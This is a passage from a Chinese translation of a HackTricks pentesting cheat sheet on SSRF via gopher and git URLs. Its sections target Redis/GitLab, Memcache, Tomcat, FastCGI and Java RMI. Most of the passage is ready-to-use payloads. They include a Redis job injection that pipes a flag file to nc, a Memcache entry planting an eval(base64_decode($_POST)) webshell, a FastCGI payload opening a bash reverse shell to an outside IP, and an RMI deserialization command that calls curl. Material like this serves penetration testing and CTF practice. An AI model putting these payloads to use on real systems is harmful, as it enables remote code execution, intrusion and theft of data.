git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
## Memcache

**常见绑定端口：11211**

* [vBulletin Memcache RCE](https://www.exploit-db.com/exploits/37815)
* [GitHub Enterprise Memcache RCE](https://www.exploit-db.com/exploits/42392)
* [Memcache的Gopher负载示例](https://blog.safebuff.com/2016/07/03/SSRF-Tips/#SSRF-memcache-Getshell)
```bash
gopher://[target ip]:11211/_%0d%0aset ssrftest 1 0 147%0d%0aa:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";s:5:"/.*/e";s:7:"replace";s:33:"eval(base64_decode($_POST[ccc]));";}}s:13:"rewritestatus";i:1;}%0d%0a
gopher://192.168.10.12:11211/_%0d%0adelete ssrftest%0d%0a
```
## Apache Tomcat

**常见绑定端口：80、443（SSL）、8080、8443（SSL）**

仅适用于Tomcat 6：

[gopher-tomcat-deployer](https://github.com/pimps/gopher-tomcat-deployer)

使用此技术的CTF解题报告：

[从XXE到RCE：Pwn2Win CTF 2018解题报告](https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/)

## FastCGI

**常见绑定端口：80、443（SSL）**

此内容来源于[这里](https://blog.chaitin.cn/gopher-attack-surfaces/)。
```bash
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
```
## Java RMI

**常见绑定端口：1090、1098、1099、1199、4443-4446、8999-9010、9999**

可以利用允许任意字节（基于 gopher）的盲 _SSRF_ 漏洞对 _Java RMI_ 默认组件（_RMI Registry_、_Distributed Garbage Collector_、_Activation System_）进行反序列化或代码库攻击。可以在[这里](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)找到详细的写作。以下示例显示了有效载荷生成的示例：
```
$ rmg serial 127.0.0.1 1090 CommonsCollections6 'curl example.burpcollaborator.net' --component reg --ssrf --gopher
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI Registry endpoint...
[+]
[+] 	SSRF Payload: gopher://127.0.0.1:1090/_%4a%52%4d%49%00%02%4c%50%ac%ed%00%05%77%22%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%02%44%15%4d[...]
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
